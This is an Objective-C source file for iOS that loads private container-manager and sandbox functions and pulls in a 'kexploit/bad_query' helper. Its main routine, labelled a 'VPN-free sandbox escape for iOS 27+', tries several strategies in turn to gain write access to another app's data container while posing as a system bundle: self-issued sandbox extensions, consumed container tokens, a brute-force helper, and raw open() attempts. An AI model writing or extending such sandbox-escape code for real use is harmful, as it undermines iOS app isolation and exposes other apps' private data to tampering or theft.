#import "DavizinMCM.h"
#import "kexploit/bad_query.h"
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <stdlib.h>
#import <unistd.h>
#import <xpc/xpc.h>
#import <fcntl.h>
#import <os/lock.h>

#pragma mark - C API types (container_query_* from libsystem_containermanager)

typedef void *(*MCMQueryCreate_t)(void);
typedef void  (*MCMQuerySetU64_t)(void *, uint64_t);
typedef void  (*MCMQuerySetXPC_t)(void *, xpc_object_t);
typedef void *(*MCMQueryGetSingle_t)(void *);
typedef void *(*MCMQueryGetError_t)(void *);
typedef void  (*MCMQueryFree_t)(void *);
typedef const char *(*MCMObjectGetPath_t)(void *);
typedef void *(*MCMObjectCopy_t)(void *);
typedef char *(*MCMObjectCopyToken_t)(void *);
typedef bool  (*MCMObjectActivate_t)(void *, bool);
typedef void  (*MCMObjectFree_t)(void *);
typedef int   (*MCMErrorGetPOSIX_t)(void *);
typedef const char *(*MCMErrorGetMessage_t)(void *);

typedef struct {
    void *handle;
    MCMQueryCreate_t    queryCreate;
    MCMQuerySetU64_t    querySetClass;
    MCMQuerySetXPC_t    querySetIdentifiers;
    MCMQuerySetU64_t    querySetFlags;
    MCMQuerySetU64_t    querySetPart;
    MCMQueryGetSingle_t queryGetSingle;
    MCMQueryGetError_t  queryGetLastError;
    MCMQueryFree_t      queryFree;
    MCMObjectGetPath_t  objectGetPath;
    MCMObjectCopy_t     objectCopy;
    MCMObjectCopyToken_t objectCopyToken;
    MCMObjectActivate_t objectActivate;
    MCMObjectFree_t     objectFree;
    MCMErrorGetPOSIX_t  errorGetPOSIX;
    MCMErrorGetMessage_t errorGetMessage;
} MCMAPI;

static MCMAPI *MCMGetAPI(void) {
    static MCMAPI api;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        api.handle = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                            RTLD_NOW | RTLD_LOCAL);
        void *h = api.handle ? api.handle : RTLD_DEFAULT;
#define LOAD(f, sym) api.f = (__typeof(api.f))dlsym(h, sym)
        LOAD(queryCreate,        "container_query_create");
        LOAD(querySetClass,      "container_query_set_class");
        LOAD(querySetIdentifiers,"container_query_set_identifiers");
        LOAD(querySetFlags,      "container_query_operation_set_flags");
        LOAD(queryGetSingle,     "container_query_get_single_result");
        LOAD(queryGetLastError,  "container_query_get_last_error");
        LOAD(queryFree,          "container_query_free");
        LOAD(objectGetPath,      "container_object_get_path");
        LOAD(objectCopy,         "container_object_copy");
        LOAD(objectCopyToken,    "container_copy_sandbox_token");
        LOAD(objectActivate,     "container_object_sandbox_extension_activate");
        LOAD(objectFree,         "container_object_free");
        LOAD(querySetPart,       "container_query_operation_set_part");
        LOAD(errorGetPOSIX,      "container_error_get_posix_errno");
        LOAD(errorGetMessage,    "container_error_get_message");
#undef LOAD
    });
    return &api;
}

#pragma mark - Lease storage (C-based, avoids NSMutableDictionary crash on iOS 27)

typedef struct {
    void *query;
    void *activation;
    char  bundleID[256];
    char  path[1024];
    bool  active;
} MCMLease;

#define MAX_LEASES 4
static MCMLease sLeases[MAX_LEASES];
static os_unfair_lock sLeaseLock = OS_UNFAIR_LOCK_INIT;

static MCMLease *findLease(const char *bundleID) {
    for (int i = 0; i < MAX_LEASES; i++) {
        if (sLeases[i].active && strcmp(sLeases[i].bundleID, bundleID) == 0)
            return &sLeases[i];
    }
    return NULL;
}

static MCMLease *allocLease(void) {
    for (int i = 0; i < MAX_LEASES; i++) {
        if (!sLeases[i].active) return &sLeases[i];
    }
    return &sLeases[0];
}

#pragma mark - Logging

static inline void DavizinMCMLog(NSString *msg) {
    NSLog(@"[DavizinMCM] %@", msg);
}

#pragma mark - bad_query grant helpers

static inline BOOL shouldUseBadQuery(void) {
    NSOperatingSystemVersion osVersion = [[NSProcessInfo processInfo] operatingSystemVersion];
    return osVersion.majorVersion >= 26;
}

int64_t DavizinGrantContainerAccess(const char *containerPath) {
    if (!shouldUseBadQuery()) {
        return -1;
    }

    NSString *cleanPath = [NSString stringWithUTF8String:containerPath];
    if ([cleanPath hasSuffix:@"/"]) {
        cleanPath = [cleanPath substringToIndex:cleanPath.length - 1];
    }

    const char *pathC = [cleanPath UTF8String];
    int64_t handle = bad_query((char *)pathC, true, NULL, false);

    if (handle >= 0) {
        DavizinMCMLog([NSString stringWithFormat:@"Grant obtenido para %@: handle=%lld", cleanPath, handle]);
    } else {
        DavizinMCMLog([NSString stringWithFormat:@"Grant FALLÓ para %@: handle=%lld", cleanPath, handle]);
    }

    return handle;
}

void DavizinReleaseContainerGrant(int64_t handle) {
    if (handle >= 0) {
        bad_query_release(handle);
        DavizinMCMLog([NSString stringWithFormat:@"Grant liberado: handle=%lld", handle]);
    }
}

#pragma mark - Container path lookup (direct C API with persistent lease)

NSString *DavizinGetContainerPath(NSString *bundleID, NSString **outError) {
    static const NSString *kRequiredID = @"com.apple.mobile.MobileHouseArrest";
    static const uint64_t kFlags = 0x900000000ULL;
    static const uint64_t kClass = 2;

    if (!bundleID || bundleID.length == 0) {
        if (outError) *outError = @"bundleID es nil o vacío";
        return nil;
    }

    NSString *currentID = NSBundle.mainBundle.bundleIdentifier;
    if (![currentID isEqualToString:(NSString *)kRequiredID]) {
        if (outError) *outError = [NSString stringWithFormat:
            @"Bundle ID: '%@'", currentID];
        return nil;
    }

    const char *bid = bundleID.UTF8String;

    os_unfair_lock_lock(&sLeaseLock);
    MCMLease *existing = findLease(bid);
    if (existing && existing->path[0]) {
        NSString *cachedPath = [NSString stringWithUTF8String:existing->path];
        os_unfair_lock_unlock(&sLeaseLock);
        return cachedPath;
    }
    os_unfair_lock_unlock(&sLeaseLock);

    MCMAPI *api = MCMGetAPI();
    if (!api->queryCreate || !api->queryGetSingle || !api->objectGetPath) {
        if (outError) *outError = @"containermanager no disponible";
        return nil;
    }

    // Single query with activation flags — matches MCMRetainedLease pattern exactly
    void *query = api->queryCreate();
    if (!query) {
        if (outError) *outError = @"query_create devolvió NULL";
        return nil;
    }

    api->querySetClass(query, kClass);
    xpc_object_t xpcID = xpc_string_create(bid);
    api->querySetIdentifiers(query, xpcID);
    api->querySetFlags(query, kFlags);
    if (api->querySetPart) api->querySetPart(query, 0);

    void *result = api->queryGetSingle(query);
    if (!result) {
        void *qErr = api->queryGetLastError ? api->queryGetLastError(query) : NULL;
        int posix = qErr && api->errorGetPOSIX ? api->errorGetPOSIX(qErr) : 0;
        const char *msg = qErr && api->errorGetMessage ? api->errorGetMessage(qErr) : NULL;
        if (outError) *outError = [NSString stringWithFormat:
            @"No encontrado '%@' posix=%d %s", bundleID, posix, msg ?: ""];
        DavizinMCMLog([NSString stringWithFormat:@"Container no encontrado para %@: posix=%d", bundleID, posix]);
        api->queryFree(query);
        return nil;
    }

    const char *rawPath = api->objectGetPath(result);
    NSString *path = rawPath ? [NSString stringWithUTF8String:rawPath] : nil;

    if (path.length == 0 || !path.isAbsolutePath) {
        if (outError) *outError = @"Path inválido";
        api->queryFree(query);
        return nil;
    }

    if ([path isEqualToString:@"/var"] || [path hasPrefix:@"/var/"])
        path = [@"/private" stringByAppendingString:path];

    // Activate sandbox extension and keep it alive (same as MCMRetainedLease.activate)
    void *activation = api->objectCopy ? api->objectCopy(result) : NULL;
    if (activation) {
        char *token = api->objectCopyToken ? api->objectCopyToken(activation) : NULL;
        bool activated = false;
        if (token && token[0] != '\0') {
            activated = api->objectActivate(activation, false);
        }
        free(token);

        if (activated) {
            os_unfair_lock_lock(&sLeaseLock);
            MCMLease *lease = allocLease();
            if (lease->active && lease->query) {
                if (lease->activation && api->objectFree) api->objectFree(lease->activation);
                api->queryFree(lease->query);
            }
            lease->query = query;
            lease->activation = activation;
            strlcpy(lease->bundleID, bid, sizeof(lease->bundleID));
            strlcpy(lease->path, path.UTF8String, sizeof(lease->path));
            lease->active = true;
            os_unfair_lock_unlock(&sLeaseLock);

            DavizinMCMLog([NSString stringWithFormat:@"Lease ACTIVADA para %@: %@", bundleID, path]);
            return path;
        } else {
            if (api->objectFree) api->objectFree(activation);
        }
    }

    // Activation failed but path is valid — keep query alive anyway, bad_query might work
    DavizinMCMLog([NSString stringWithFormat:@"Container encontrado (sin lease) para %@: %@", bundleID, path]);
    api->queryFree(query);
    return path;
}

#pragma mark - Probe: VPN-free sandbox escape for iOS 27+

typedef int64_t (*SandboxExtConsumeFunc)(const char *);
typedef int64_t (*SandboxExtReleaseFunc)(int64_t);
typedef char   *(*SandboxIssueFileFunc)(const char *, const char *, uint32_t);
typedef char   *(*SandboxIssueFilePidFunc)(const char *, const char *, uint32_t, pid_t);
typedef int     (*SandboxCheckFunc)(pid_t, const char *, int, ...);
#define SANDBOX_FILTER_PATH 1

static char sProbeDiag[8192] = "";
static int  sProbeDiagLen = 0;

static void _probeDiagReset(void) { sProbeDiag[0] = '\0'; sProbeDiagLen = 0; }
static void _probeDiagAppend(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
static void _probeDiagAppend(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    int remaining = (int)sizeof(sProbeDiag) - sProbeDiagLen - 1;
    if (remaining > 0) {
        int n = vsnprintf(sProbeDiag + sProbeDiagLen, remaining, fmt, ap);
        if (n > 0) sProbeDiagLen += (n < remaining ? n : remaining);
    }
    va_end(ap);
}

const char *DavizinLastProbeDiagnostic(void) {
    return sProbeDiag;
}

static BOOL _mcmProbeCanWrite(const char *dirPath) {
    char canary[1200];
    snprintf(canary, sizeof(canary), "%s/.mcm_probe_canary", dirPath);
    FILE *f = fopen(canary, "w");
    if (!f) return NO;
    fprintf(f, "mcmprobe");
    fclose(f);
    f = fopen(canary, "r");
    if (!f) { unlink(canary); return NO; }
    char buf[16] = {0};
    fread(buf, 1, 8, f);
    fclose(f);
    unlink(canary);
    return (strcmp(buf, "mcmprobe") == 0);
}

static void _storeLease(MCMAPI *api, void *q, void *act, const char *bid, const char *path) {
    os_unfair_lock_lock(&sLeaseLock);
    MCMLease *lease = allocLease();
    if (lease->active && lease->query) {
        if (lease->activation && api->objectFree) api->objectFree(lease->activation);
        api->queryFree(lease->query);
    }
    lease->query = q;
    lease->activation = act;
    strlcpy(lease->bundleID, bid, sizeof(lease->bundleID));
    strlcpy(lease->path, path, sizeof(lease->path));
    lease->active = true;
    os_unfair_lock_unlock(&sLeaseLock);
}

DavizinProbeResult DavizinProbeContainerWriteAccess(NSString *containerPath, NSString *bundleID) {
    DavizinProbeResult result = { .method = 0, .handle = -1, .writeOK = NO };
    result.detail[0] = '\0';
    _probeDiagReset();

    if (!containerPath || containerPath.length == 0 || !bundleID || bundleID.length == 0) {
        strlcpy(result.detail, "nil containerPath or bundleID", sizeof(result.detail));
        return result;
    }

    const char *pathC = containerPath.UTF8String;
    const char *bidC = bundleID.UTF8String;

    _probeDiagAppend("target=%s bid=%s | ", pathC, bidC);

    MCMAPI *api = MCMGetAPI();
    SandboxExtConsumeFunc consumeExt = (SandboxExtConsumeFunc)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    SandboxExtReleaseFunc releaseExt = (SandboxExtReleaseFunc)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    SandboxIssueFileFunc  issueFile  = (SandboxIssueFileFunc)dlsym(RTLD_DEFAULT, "sandbox_extension_issue_file");
    SandboxIssueFilePidFunc issueFilePid = (SandboxIssueFilePidFunc)dlsym(RTLD_DEFAULT, "sandbox_extension_issue_file_to_process_by_pid");
    SandboxCheckFunc sbCheck = (SandboxCheckFunc)dlsym(RTLD_DEFAULT, "sandbox_check");

    if (!consumeExt) {
        strlcpy(result.detail, "missing sandbox_extension_consume", sizeof(result.detail));
        return result;
    }

    // ── DIAGNOSTIC: Check current sandbox permissions ──
    if (sbCheck) {
        int canW = sbCheck(getpid(), "file-write-data", SANDBOX_FILTER_PATH, pathC);
        int canR = sbCheck(getpid(), "file-read-data", SANDBOX_FILTER_PATH, pathC);
        _probeDiagAppend("sb_check: write=%d read=%d | ", canW, canR);
        DavizinMCMLog([NSString stringWithFormat:@"[Probe] sandbox_check BEFORE: write=%d read=%d", canW, canR]);
        if (canW == 0 && _mcmProbeCanWrite(pathC)) {
            result.method = 99;
            result.handle = 0;
            result.writeOK = YES;
            strlcpy(result.detail, "sandbox already allows write (no escape needed)", sizeof(result.detail));
            _probeDiagAppend("*** ALREADY WRITABLE ***");
            return result;
        }
    }

    // ── Strategy 0: sandbox_extension_issue_file (self-issued extension) ──
    // As com.apple.mobile.MobileHouseArrest, we may have entitlement to issue file extensions
    {
        static const char *kExtClasses[] = {
            "com.apple.app-sandbox.read-write",
            "com.apple.app-sandbox.read",
            "com.apple.sandbox.container",
            "com.apple.security.exception.files.absolute-path.read-write",
        };
        int nClasses = sizeof(kExtClasses) / sizeof(kExtClasses[0]);

        for (int ci = 0; ci < nClasses; ci++) {
            // 0a: sandbox_extension_issue_file
            if (issueFile) {
                char *token = issueFile(kExtClasses[ci], pathC, 0);
                _probeDiagAppend("S0a[%s]=%s | ", kExtClasses[ci], token ? "tok" : "nil");
                if (token) {
                    int64_t h = consumeExt(token);
                    if (h >= 0 && _mcmProbeCanWrite(pathC)) {
                        result.method = 3;
                        result.handle = h;
                        result.writeOK = YES;
                        snprintf(result.detail, sizeof(result.detail),
                                 "issue_file(%s) VERIFIED h=%lld", kExtClasses[ci], (long long)h);
                        _probeDiagAppend("*** SUCCESS S0a ***");
                        free(token);
                        return result;
                    }
                    if (h >= 0 && releaseExt) releaseExt(h);
                    free(token);
                }
            }
            // 0b: sandbox_extension_issue_file_to_process_by_pid (self)
            if (issueFilePid) {
                char *token = issueFilePid(kExtClasses[ci], pathC, 0, getpid());
                _probeDiagAppend("S0b[%s]=%s | ", kExtClasses[ci], token ? "tok" : "nil");
                if (token) {
                    int64_t h = consumeExt(token);
                    if (h >= 0 && _mcmProbeCanWrite(pathC)) {
                        result.method = 4;
                        result.handle = h;
                        result.writeOK = YES;
                        snprintf(result.detail, sizeof(result.detail),
                                 "issue_file_pid(%s) VERIFIED h=%lld", kExtClasses[ci], (long long)h);
                        _probeDiagAppend("*** SUCCESS S0b ***");
                        free(token);
                        return result;
                    }
                    if (h >= 0 && releaseExt) releaseExt(h);
                    free(token);
                }
            }
        }
    }

    // ── Strategy 1: MCM class-2 query → sandbox token ──
    if (api->queryCreate) {
        _probeDiagAppend("S1:MCM | ");
        void *q = api->queryCreate();
        if (q) {
            api->querySetClass(q, 2);
            xpc_object_t xid = xpc_string_create(bidC);
            api->querySetIdentifiers(q, xid);
            api->querySetFlags(q, 0x900000000ULL);
            if (api->querySetPart) api->querySetPart(q, 0);

            void *res = api->queryGetSingle(q);
            if (res) {
                // 1a: objectActivate(false)
                if (api->objectCopy && api->objectActivate) {
                    void *act = api->objectCopy(res);
                    if (act) {
                        bool ok = api->objectActivate(act, false);
                        _probeDiagAppend("1a=%d ", ok);
                        if (ok && _mcmProbeCanWrite(pathC)) {
                            result.method = 1; result.handle = 0; result.writeOK = YES;
                            strlcpy(result.detail, "MCM activate(false) VERIFIED", sizeof(result.detail));
                            _probeDiagAppend("*** SUCCESS 1a ***");
                            _storeLease(api, q, act, bidC, pathC);
                            xpc_release(xid);
                            return result;
                        }
                        if (api->objectFree) api->objectFree(act);
                    }
                }
                // 1b: objectActivate(true) — force mode
                if (api->objectCopy && api->objectActivate) {
                    void *act = api->objectCopy(res);
                    if (act) {
                        bool ok = api->objectActivate(act, true);
                        _probeDiagAppend("1b=%d ", ok);
                        if (ok && _mcmProbeCanWrite(pathC)) {
                            result.method = 1; result.handle = 0; result.writeOK = YES;
                            strlcpy(result.detail, "MCM activate(true) VERIFIED", sizeof(result.detail));
                            _probeDiagAppend("*** SUCCESS 1b ***");
                            _storeLease(api, q, act, bidC, pathC);
                            xpc_release(xid);
                            return result;
                        }
                        if (api->objectFree) api->objectFree(act);
                    }
                }
                // 1c: raw sandbox_extension_consume on the MCM sandbox token
                if (api->objectCopyToken) {
                    char *token = api->objectCopyToken(res);
                    if (token && token[0]) {
                        int64_t h = consumeExt(token);
                        _probeDiagAppend("1c:h=%lld ", (long long)h);
                        if (h >= 0 && _mcmProbeCanWrite(pathC)) {
                            result.method = 2; result.handle = h; result.writeOK = YES;
                            snprintf(result.detail, sizeof(result.detail),
                                     "MCM raw consume VERIFIED h=%lld", (long long)h);
                            _probeDiagAppend("*** SUCCESS 1c ***");
                            free(token);
                            _storeLease(api, q, NULL, bidC, pathC);
                            xpc_release(xid);
                            return result;
                        }
                        if (h >= 0 && releaseExt) releaseExt(h);
                    } else {
                        _probeDiagAppend("1c:no_token ");
                    }
                    free(token);
                }
                // 1d: Try open() directly after MCM query (implicit grant from containermanagerd)
                {
                    char testFile[1200];
                    snprintf(testFile, sizeof(testFile), "%s/.mcm_implicit_test", pathC);
                    int fd = open(testFile, O_WRONLY | O_CREAT | O_TRUNC, 0644);
                    _probeDiagAppend("1d:fd=%d ", fd);
                    if (fd >= 0) {
                        const char *payload = "implicitOK";
                        write(fd, payload, 10);
                        close(fd);
                        FILE *vf = fopen(testFile, "r");
                        if (vf) {
                            char buf[16] = {0};
                            fread(buf, 1, 10, vf);
                            fclose(vf);
                            unlink(testFile);
                            if (strcmp(buf, "implicitOK") == 0) {
                                result.method = 5; result.handle = 0; result.writeOK = YES;
                                strlcpy(result.detail, "MCM implicit grant (open after query) VERIFIED", sizeof(result.detail));
                                _probeDiagAppend("*** SUCCESS 1d ***");
                                _storeLease(api, q, NULL, bidC, pathC);
                                xpc_release(xid);
                                return result;
                            }
                        }
                        unlink(testFile);
                    }
                }
            } else {
                _probeDiagAppend("S1:null_result ");
            }
            xpc_release(xid);
            api->queryFree(q);
        }
    }

    // ── Strategy 1.5: MCM with different part values (1,2,3) ──
    if (api->queryCreate && api->querySetPart) {
        for (uint64_t part = 1; part <= 3; part++) {
            void *q = api->queryCreate();
            if (!q) continue;
            api->querySetClass(q, 2);
            xpc_object_t xid = xpc_string_create(bidC);
            api->querySetIdentifiers(q, xid);
            api->querySetFlags(q, 0x900000000ULL);
            api->querySetPart(q, part);

            void *res = api->queryGetSingle(q);
            if (res && api->objectCopyToken) {
                char *token = api->objectCopyToken(res);
                if (token && token[0]) {
                    int64_t h = consumeExt(token);
                    _probeDiagAppend("S1.5p%llu:h=%lld ", (unsigned long long)part, (long long)h);
                    if (h >= 0 && _mcmProbeCanWrite(pathC)) {
                        result.method = 6; result.handle = h; result.writeOK = YES;
                        snprintf(result.detail, sizeof(result.detail),
                                 "MCM part=%llu consume VERIFIED h=%lld", (unsigned long long)part, (long long)h);
                        _probeDiagAppend("*** SUCCESS S1.5 ***");
                        free(token); _storeLease(api, q, NULL, bidC, pathC);
                        xpc_release(xid);
                        return result;
                    }
                    if (h >= 0 && releaseExt) releaseExt(h);
                }
                free(token);
            }
            xpc_release(xid);
            api->queryFree(q);
        }
    }

    // ── Strategy 2: bad_query_probe_write (multi-class/flags brute force) ──
    _probeDiagAppend("S2:bq | ");
    {
        BQProbeResult bq = bad_query_probe_write(pathC, bidC);
        _probeDiagAppend("bq:m=%d ok=%d ", bq.method, bq.write_ok);
        if (bq.write_ok) {
            result.method = bq.method + 10;
            result.handle = bq.handle;
            result.writeOK = YES;
            snprintf(result.detail, sizeof(result.detail), "bad_query: %s", bq.detail);
            _probeDiagAppend("*** SUCCESS S2 ***");
            return result;
        }
    }

    // ── Strategy 3: Direct open() with various flags (Hail Mary) ──
    {
        char testFile[1200];
        snprintf(testFile, sizeof(testFile), "%s/.hail_mary_test", pathC);

        // Try open with O_NOFOLLOW and O_SYMLINK variants
        int flags[] = {
            O_WRONLY | O_CREAT | O_TRUNC,
            O_RDWR | O_CREAT | O_TRUNC,
            O_WRONLY | O_CREAT,
        };
        for (int i = 0; i < 3; i++) {
            int fd = open(testFile, flags[i], 0666);
            if (fd >= 0) {
                write(fd, "hailmary", 8);
                close(fd);
                FILE *vf = fopen(testFile, "r");
                if (vf) {
                    char buf[16] = {0};
                    fread(buf, 1, 8, vf);
                    fclose(vf);
                    unlink(testFile);
                    if (strcmp(buf, "hailmary") == 0) {
                        result.method = 50 + i;
                        result.handle = 0;
                        result.writeOK = YES;
                        snprintf(result.detail, sizeof(result.detail),
                                 "direct open(flags=0x%x) VERIFIED", flags[i]);
                        _probeDiagAppend("*** SUCCESS S3 flags=%d ***", flags[i]);
                        return result;
                    }
                }
                unlink(testFile);
            }
        }
        _probeDiagAppend("S3:fail ");
    }

    // ── Post-diagnostic: sandbox_check after all attempts ──
    if (sbCheck) {
        int canW = sbCheck(getpid(), "file-write-data", SANDBOX_FILTER_PATH, pathC);
        _probeDiagAppend("sb_after: w=%d", canW);
    }

    strlcpy(result.detail, "all probe strategies exhausted", sizeof(result.detail));
    _probeDiagAppend(" | EXHAUSTED");
    DavizinMCMLog(@"[Probe] ALL STRATEGIES FAILED");
    return result;
}

void DavizinProbeRelease(DavizinProbeResult *res) {
    if (!res || res->handle <= 0) return;
    SandboxExtReleaseFunc releaseExt = (SandboxExtReleaseFunc)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (releaseExt) releaseExt(res->handle);
    res->handle = -1;
}

#pragma mark - Stubs

NSString *DavizinPrepareInjectionQuery(NSString *bundleID, NSString **outErr) {
    return nil;
}

NSString *DavizinMCMLastDiagnostic(void) {
    return @"Using direct container_query C API with persistent lease + probe";
}
